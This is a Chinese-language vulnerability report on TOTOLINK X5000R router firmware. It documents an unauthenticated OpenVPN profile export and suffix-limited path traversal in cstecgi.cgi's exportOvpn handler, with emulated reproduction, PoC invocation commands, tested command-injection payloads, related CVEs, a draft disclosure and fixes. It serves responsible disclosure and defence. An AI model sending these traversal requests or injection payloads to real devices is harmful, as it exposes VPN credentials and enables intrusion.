# TOTOLINK X5000R cstecgi.cgi exportOvpn 未授权 OpenVPN 文件导出与限定路径穿越报告

## 结论

本次对 TOTOLINK X5000R 固件中的 `/web/cgi-bin/cstecgi.cgi` 进行了静态分析、QEMU/chroot 动态验证和 RCE 方向尝试。已验证存在一个可复现的独立漏洞点：

```text
未认证攻击者可访问 exportOvpn 分支，导出已存在的 OpenVPN 用户配置文件或压缩包；
同时 username/name 参数可使用 ../ 进行限定路径穿越，读取匹配 .ovpn 或 .tar.gz 后缀的文件。
```

已动态复现版本：

- `V9.1.0cu.2415_B20250515`
- `V9.1.0cu.2350_B20230313`

当前不建议将该漏洞上报为 RCE。原因是典型命令注入字符已被过滤，URL 编码字符不会被解码为 shell 元字符；固件样本中也未发现实际 `openvpn-cert` 可执行文件，无法证明通过该运行时组件继续形成命令执行。

## 影响组件

目标 CGI：

```text
/web/cgi-bin/cstecgi.cgi
```

外部请求入口：

```text
/cgi-bin/cstecgi.cgi?exportOvpn&type=user&name=<user>&mode=config
/cgi-bin/cstecgi.cgi?exportOvpn&type=user&name=<user>&filetype=gz
```

说明：CGI 对 query string 的处理依赖参数位置。`arg0` 需要包含 `exportOvpn`，`arg1` 需要为 `type=user`，`arg2` 为用户名字段，`arg3` 为 `mode=config` 或 `filetype=gz`。`arg2` 的键名本身不重要，程序取的是 `=` 后的值，因此 `name=alice` 和 `username=alice` 在该位置上均可触发同类行为。

## 根因分析

静态证据文件：

```text
inout/work/deepdive/exportovpn_static/combined_static.txt
inout/work/deepdive/exportovpn_related/evidence.txt
```

`cstecgi.cgi` 中可观察到如下字符串：

```text
exportOvpn
openvpn-cert build_user %s gz
/etc/openvpn/server/user/%s.tar.gz
openvpn-cert build_user %s config
/etc/openvpn/server/user/%s.ovpn
can not open config file
```

逻辑上，程序先进入 `exportOvpn` 分支，再从固定位置提取用户名，随后拼接命令和导出路径：

```c
system("openvpn-cert build_user <username> config");
fopen("/etc/openvpn/server/user/<username>.ovpn", "rb");

system("openvpn-cert build_user <username> gz");
fopen("/etc/openvpn/server/user/<username>.tar.gz", "rb");
```

问题点：

- `exportOvpn` 分支位于普通 JSON/token 鉴权逻辑之前，可未授权访问。
- 用户名参与文件路径拼接时没有做路径规范化和目录边界检查。
- `../` 不会被拦截，最终可从 `/etc/openvpn/server/user/` 向上穿越。
- 文件读取被固定后缀限制：`mode=config` 追加 `.ovpn`，`filetype=gz` 追加 `.tar.gz`。

因此该漏洞不是“全局任意文件读取”，而是“未授权 OpenVPN 文件导出 + 后缀受限的路径穿越读取”。

## 动态验证

验证脚本：

```text
scripts/probe_totolink_exportovpn_versions.sh
```

证据文件：

```text
inout/work/deepdive/exportovpn_versions/combined_evidence.txt
```

验证方法：

- 使用原始 MIPS `cstecgi.cgi` 和固件动态库。
- 复制临时 rootfs，不修改原始固件样本。
- 使用 chroot + `qemu-mipsel-static` 执行 CGI。
- 在临时 rootfs 中预置 OpenVPN 导出文件，模拟真实设备已生成用户配置的运行时状态。
- 使用 `/bin/sh` wrapper 记录 `system()` 收到的命令字符串。

关键复现结果：

```text
exportOvpn&type=user&name=alice&mode=config
HTTP/1.1 200 OK
OVPN_SECRET_FOR_ALICE
```

```text
exportOvpn&type=user&name=alice&filetype=gz
HTTP/1.1 200 OK
TARGZ_SECRET_FOR_ALICE
```

```text
exportOvpn&type=user&name=../passwd&mode=config
HTTP/1.1 200 OK
TRAVERSAL_SECRET
```

```text
exportOvpn&type=user&name=../passwd&filetype=gz
HTTP/1.1 200 OK
TRAVERSAL_GZ_SECRET
```

更深层级穿越也可命中对应后缀文件：

```text
name=../../passwd    -> /etc/openvpn/passwd.ovpn
name=../../../passwd -> /etc/passwd.ovpn
```

未命中的边界：

```text
name=..%2fpasswd -> 未解码为路径穿越
name=/etc/passwd -> 不等价于读取 /etc/passwd，会追加 .ovpn
```

## PoC

PoC 文件：

```text
pocs/totolink_x5000r_exportovpn_pre_auth_file_disclosure.py
```

生成请求路径：

```bash
python pocs/totolink_x5000r_exportovpn_pre_auth_file_disclosure.py http://192.168.0.1 --user alice --path-only
```

读取 OpenVPN 用户配置：

```bash
python pocs/totolink_x5000r_exportovpn_pre_auth_file_disclosure.py http://192.168.0.1 --user alice
```

读取 OpenVPN 导出压缩包：

```bash
python pocs/totolink_x5000r_exportovpn_pre_auth_file_disclosure.py http://192.168.0.1 --user alice --gz
```

路径穿越测试：

```bash
python pocs/totolink_x5000r_exportovpn_pre_auth_file_disclosure.py http://192.168.0.1 --user ../passwd
python pocs/totolink_x5000r_exportovpn_pre_auth_file_disclosure.py http://192.168.0.1 --user ../passwd --gz
```

PoC 已通过语法检查：

```text
python -m py_compile pocs/totolink_x5000r_exportovpn_pre_auth_file_disclosure.py
```

## RCE 方向验证

验证脚本和证据：

```text
scripts/probe_totolink_exportovpn_rce_attempts.sh
scripts/test_totolink_shell_metachar_runtime.sh
scripts/probe_totolink_exportovpn_real_shell_rce.sh

inout/work/deepdive/exportovpn_rce_attempts/combined_evidence.txt
inout/work/deepdive/shell_meta_runtime/evidence.txt
inout/work/deepdive/exportovpn_real_shell_rce/combined_evidence.txt
```

已测试 payload 类型：

```text
; touch /tmp/pwned
| touch /tmp/pwned
`touch /tmp/pwned`
$(touch /tmp/pwned)
raw LF
raw CR
raw tab
space argument injection
%3b / %7c / %26 / %0a URL 编码形式
filetype/type 参数注入
```

结果：

- `;`、`|`、反引号、`$()`、原始 LF 会被过滤，返回 `HTTP/1.1 501 OK`。
- URL 编码的 `%3b`、`%7c`、`%26`、`%0a` 不会被解码成 shell 元字符，而是作为普通字符串进入命令。
- 空格、tab、CR 可进入命令字符串，但在 BusyBox shell 语义下不构成额外命令分隔。
- `filetype` 不直接参与命令拼接，只决定固定字符串 `config` 或 `gz`。
- 当前两个 TOTOLINK X5000R 样本中未发现 `openvpn-cert` 实体文件；只在 `liboperations.so` 中发现 `/usr/sbin/openvpn-cert` 字符串引用。因此无法验证 `openvpn-cert` 自身是否还存在脚本级参数注入。

当前可进入 `system()` 的非 RCE 形态示例：

```text
openvpn-cert build_user a%3btouch%20/tmp/pwned config
openvpn-cert build_user a%7ctouch%20/tmp/pwned config
openvpn-cert build_user a b config
openvpn-cert build_user alice --help config
```

这些没有形成额外命令执行。

结论：在当前固件样本和可复现环境下，不能证明 `exportOvpn` 存在 RCE。若真实设备安装了额外运行时包 `/usr/sbin/openvpn-cert`，仍建议拿真实设备或完整 rootfs 继续复核该组件的参数处理；但这属于未验证假设，不能写入已验证漏洞结论。

## 真实利用条件

攻击者无需登录 Web 管理后台。实际影响取决于设备运行时状态：

- 设备已启用 OpenVPN，并生成过用户配置文件。
- `/etc/openvpn/server/user/<user>.ovpn` 或 `.tar.gz` 已存在。
- 或真实设备上的 `openvpn-cert build_user <user> config/gz` 可生成对应导出文件。
- 路径穿越读取目标必须能在追加 `.ovpn` 或 `.tar.gz` 后命中。

可造成的影响：

- 泄露 OpenVPN 用户配置、证书、连接信息。
- 在 OpenVPN 用户配置可用时，攻击者可能获得 VPN 接入材料。
- 通过 `../` 读取 OpenVPN 相关目录外、但后缀匹配的敏感文件。

## CVE 与重复风险

已公开的相近漏洞：

- `CVE-2025-14586`：`exportOvpn&type=user` 命令注入，公开影响版本包括 `9.1.0cu.2089_B20211224`，多处记录将其描述为需低权限或认证场景的命令注入。
- `CVE-2025-13184`：X5000R `action=telnet` 未授权开启 Telnet，与本漏洞入口和影响不同。
- 还存在若干 X5000R `cstecgi.cgi` 其他参数的历史 RCE/DoS 记录，例如 `ipsec*`、`setModifyVpnUser`、`CONTENT_LENGTH` 等。

本次漏洞与 `CVE-2025-14586` 的区别：

- 本次验证版本为 `V9.1.0cu.2415_B20250515` 和 `V9.1.0cu.2350_B20230313`。
- 本次漏洞类型是未授权文件导出和限定路径穿越，不是已验证命令注入。
- 当前 RCE 尝试未成功，不建议复用命令注入标题。

建议提交标题：

```text
TOTOLINK X5000R cstecgi.cgi exportOvpn pre-authenticated OpenVPN profile disclosure and suffix-constrained path traversal
```

建议英文描述：

```text
TOTOLINK X5000R cstecgi.cgi exportOvpn handler processes OpenVPN export requests before authentication. A remote unauthenticated attacker can download existing OpenVPN user profiles or archives. The username value is concatenated into /etc/openvpn/server/user/%s.ovpn or /etc/openvpn/server/user/%s.tar.gz without path normalization, allowing ../ traversal to read suffix-matching files outside the user directory.
```

## 修复建议

1. 将 `exportOvpn` 分支移动到统一 token/session 鉴权之后。
2. 对用户名使用严格白名单，例如 `^[A-Za-z0-9_-]{1,64}$`。
3. 对最终路径执行规范化检查，确保路径必须位于 `/etc/openvpn/server/user/` 内。
4. 禁止未认证请求触发 `openvpn-cert build_user`。
5. 避免使用 `system()` 拼接命令；如必须执行外部程序，应使用参数数组形式并避免 shell 解释。

## 本次新增/保留文件

```text
pocs/totolink_x5000r_exportovpn_pre_auth_file_disclosure.py
scripts/probe_totolink_exportovpn_versions.sh
scripts/probe_totolink_exportovpn_rce_attempts.sh
scripts/test_totolink_shell_metachar_runtime.sh
scripts/probe_totolink_exportovpn_real_shell_rce.sh
scripts/analyze_totolink_exportovpn_static.sh
scripts/inspect_totolink_openvpn_related.sh
TOTOLINK_X5000R_exportOvpn_verified_report_2026-06-08.md
```

